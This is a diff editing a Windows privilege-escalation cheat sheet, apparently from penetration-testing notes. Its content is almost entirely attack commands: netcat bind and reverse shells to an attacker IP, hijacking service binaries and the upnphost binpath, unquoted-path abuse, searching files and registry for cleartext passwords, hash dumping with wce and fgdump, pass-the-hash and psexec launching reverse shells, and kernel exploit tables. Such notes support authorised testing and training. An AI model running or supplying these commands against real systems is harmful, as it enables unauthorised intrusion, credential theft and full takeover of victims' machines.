@@ -1,17 +1,18 @@
 *Windows elevation of privileges*narrative
-Shell
+From RCE to shell
     Getting a shell
     *$ system("start cmd.exe /k $cmd")*
+    Bind cmd to a port:
+    *$ nc.exe -Lp 31337 -vv -e cmd.exe*
+    Reverse shell:
     *$ nc.exe attacker_ip attacker_port -e cmd.exe*
 
-    Getting a reverse shell
-    *$ nc.exe -Lp 31337 -vv -e cmd.exe*
-
 EoP 0: System info
+    Finding installed software, running processes, bind ports, and OS version might be critical to identify the right EoP vector.
     Find installed patches, architecture, OS version
     *$ systeminfo*
 
-    Get system version
+    Get exact OS version
     *$ type C:/Windows/system32/eula.txt*
 
     Hostname.
@@ -38,7 +39,7 @@ EoP 0: System info
 
     Firewall information
     *$ netsh firewall show state
-netsh firewall show config*
+$ netsh firewall show config*
 
     List scheduled tasks
     *$ schtasks /query /fo LIST /v*
@@ -49,9 +50,16 @@ netsh firewall show config*
     *$ tasklist /SVC*
 
 EoP 1: Incorrect permissions in services
-    If you find a service that has write permissions set to everyone you can change that binary into your custom binary and make it execute in the privileged context.+
+    A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.
+    We are interested in services where permissions are: **BUILTIN\Users** with **(F)** or **(C)** or **(M)** for our group. More info about permissions:
+    *https://msdn.microsoft.com/en-us/library/bb727008.aspx*
 
-    Find affected services:
+    Common exploitation payloads involve: Replacing the affecting binary with a reverse shell or a command that creates a new user and adds it to the Administrator group. Replace the affected service with your payload and  and restart the service running:
+    *$ wmic service NAMEOFSERVICE call startservice
+net stop [service name] && net start [service name]*
+    *$ sc start/stop serviceName*
+
+    The following commands will print the affected services:
     *$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
 $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"*
 
@@ -62,25 +70,17 @@ type Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
 FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt*
 
-    You can process each service using cacls:
+    You can also manually check each service using cacls:
     *$ cacls "C:\path\to\file.exe"*
-    We are interested in services where we have BUILTIN\Users:(F) or (C) or (M) for our group. More info about permissions:
-    *https://msdn.microsoft.com/en-us/library/bb727008.aspx*
-
-    Transfer your binary (reverse shell/add your user to admin group).
-    then move new old, and restart the service with:
-    *$ wmic service NAMEOFSERVICE call startservice
-net stop [service name] && net start [service name]*
-    *$ sc start/stop serviceName*
 
     If you don't have access to vmic, you can do:
     *$ sc qc upnphost*
-    Windows XP SP1 is known to be vulnerable to EoP in upnphost:
+    Windows XP SP1 is known to be vulnerable to EoP in *upnphost*. You get Administrator with:
     *$ sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
 sc config upnphost obj= ".\LocalSystem" password= ""
 sc qc upnphost*
 
-    If it fails because of a missing dependency:
+    If it fails because of a missing dependency, run the following:
     *$ sc config SSDPSRV start= auto
 net start SSDPSRV
 net start upnphost*
@@ -111,23 +111,24 @@ sc start <vuln-service>*
 
 
 EoP2: Find unquoted paths
-    *$ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """*
-
+    If we find a service running as SYSTEM/Administrator with an unquoted path and spaces in the path we can hijack the path and use it to elevate privileges. This occurs because windows will try, for every whitespace, to find the binary in every intermediate folder.
     For example, the following path would be vulnerable:
     *c:\Program Files\something\winamp.exe*
-    We can place a binary like this
+    We could place our payload with any of the following paths:
     *c:\Program.exe*
     *c:\Program Files.exe*
+    The following command will display affected services:
+    *$ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """*
 
-    We might even be able to override the service executable, check out the permissions:
+    We might even be able to override the service executable, always check out the permissions of the service binary:
     *$ icacls "C:\Program Files (x86)\Program Folder"*
 
-    Using meterpreter
+    You can autoamte with meterpreter:
     *> exploit/windows/local/trusted_service_path*
 
 
 EoP3: ClearText passwords (quick hits)
-    Search for them
+    We might somtetimes find passwords in arbitrary files, you can find them running:
     *$ findstr /si password *.txt
 findstr /si password *.xml
 findstr /si password *.ini*
@@ -161,23 +162,24 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password*
 reg query HKCU /f password /t REG_SZ /s*
     Using meterpreter:
     *> post/windows/gather/credentials/gpp
-    post/windows/gather/enum_unattend*
+post/windows/gather/enum_unattend*
 
 EoP4: Pass the hash
     Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.
-    Hash dump
+    Windows hash format:
+    *user:group:id:ntlmpassword::*
+
+    You can do a hash dump in the affected system running:
     *wce32.exe -w
 wce64.exe -w
 fgdump.exe*
-    * $ cd /usr/share/windows-binaries/fgdump; python -m SimpleHTTPServer 80*
     Download and run fgdump.exe on the target machine.
+    * $ cd /usr/share/windows-binaries/fgdump; python -m SimpleHTTPServer 80*
     *$ pth-winexe -U DOMAIN/user%hash //$ip cmd*
     or:
     *export SMBHASH=xxx
 $ pth-winexe -U user%  //$ip cmd*
-    Windows hash format:
-    *user:group:id:ntlmpassword::*
-    You can do run as, with the hash:
+    You can also do run as, with the hash:
     Technique 1:
     *C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"*
     Technique 2:
@@ -190,7 +192,7 @@ $computer = "<hostname>"
     *$ psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc <attacker_ip> 4444 -e cmd.exe"*
 
 EoP5: Services only available from loopback
-    You can find services bind to the loopback interface that are not reachable through the network running.look for LISTENING/LISTEN:
+    You can find services bind to the loopback interface that are not reachable through the network running.look for **LISTENING/LISTEN**:
     *netstat -ano*
 
     Port forward using plink
@@ -218,7 +220,7 @@ portfwd add -l 3306 -p 3306 -r 192.168.1.101*
     *$ wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py*
 
 EoP6: AlwaysInstallElevated
-    AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.
+    **AlwaysInstallElevated** is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.
 
     Check if these 2 registry values are set to "1":
 
@@ -247,6 +249,7 @@ EoP 8: Kernel vulnerabilities
     *$ python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt*
     Find installed paths:
     *$ wmic qfe get Caption,Description,HotFixID,InstalledOn*
+    Comprehensive talbes of vulnerabilities below:
     *eDB   Vuln Name         MS#     2K       XP     2003    2008      Vista      7
 271   Lsasrv.dll     MS04-011  SP2,3,4  SP0,1    -       -        -         -
 350   Util Manager   MS04-019  SP2,3,4  -        -       -        -         -
